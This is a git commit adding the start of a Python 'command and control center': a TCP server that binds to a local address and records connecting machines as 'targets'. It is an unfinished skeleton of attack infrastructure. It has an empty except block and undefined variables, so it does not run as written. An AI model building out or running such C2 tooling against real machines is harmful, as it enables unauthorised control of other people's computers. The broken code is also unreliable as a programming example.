e7d88d8164e00c96a8517a7e4dcf78a9de859925
abhimanyuGupta <abhimanyu.gupta@rubberduckypro.com>
2023-12-06 14:31:25 +0530

    command and control center

--- commandAndControlCenter.py
+++ commandAndControlCenter.py
@@ -1,1 +1,32 @@
 import threading
+import socket
+import json
+import base64
+
+global s
+ip = []
+targets = []
+
+
+
+
+def server():
+	global clients
+	while True:
+		s.settimeout(1)
+		try:
+			target, ip = s.accept()
+			targets.append(ip)
+			print(str(targets[clients]) +  "---" + str(ips[clients]))
+		except:
+
+
+
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind(("192.168.0.108", 1234))
+s.listen(5)
+
+
+clients = 0
